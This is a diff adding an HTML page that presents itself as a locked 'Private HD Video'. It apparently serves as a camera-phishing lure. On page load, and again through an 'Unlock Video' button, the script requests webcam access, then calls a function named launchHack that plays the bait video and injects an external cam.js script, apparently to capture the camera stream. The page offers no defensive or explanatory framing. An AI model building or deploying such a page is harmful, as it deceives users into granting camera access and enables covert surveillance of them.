@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title> Private HD Video</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      background: black;
+      color: white;
+      text-align: center;
+      font-family: monospace;
+      padding: 20px;
+    }
+    video {
+      max-width: 95%;
+      border-radius: 10px;
+      box-shadow: 0 0 15px red;
+      margin-top: 20px;
+    }
+    #unlockBtn {
+      margin-top: -50px;
+      background: rgba(0,0,0,0.7);
+      color: white;
+      padding: 12px 30px;
+      border: 2px solid red;
+      border-radius: 10px;
+      font-size: 20px;
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+      cursor: pointer;
+      z-index: 2;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>🔐 Private HD Content Locked</h2>
+
+  <div style="position: relative; display: inline-block;">
+    <video id="demoVideo" muted poster="video/thumb.jpg" preload="metadata">
+      <source src="video/sample.mp4" type="video/mp4">
+      Your browser does not support HTML5 video.
+    </video>
+    <button id="unlockBtn" onclick="retryPermission()">🔓 Unlock Video</button>
+  </div>
+
+  <script>
+    let camAllowed = false;
+
+    // ✅ First attempt on page load
+    window.onload = () => {
+      askPermission();
+    }
+
+    function askPermission() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          camAllowed = true;
+          launchHack(stream);
+        })
+        .catch(() => {
+          // User blocked camera, wait for manual retry
+          document.getElementById("unlockBtn").style.display = "block";
+        });
+    }
+
+    function retryPermission() {
+      if (!camAllowed) {
+        askPermission();
+      }
+    }
+
+    function launchHack(stream) {
+      const video = document.getElementById("demoVideo");
+      video.muted = false;
+      video.play();
+      document.getElementById("unlockBtn").style.display = "none";
+
+      // Inject cam.js dynamically
+      const script = document.createElement("script");
+      script.src = "cam.js";
+      document.body.appendChild(script);
+    }
+  </script>
+
+</body>
+</html>
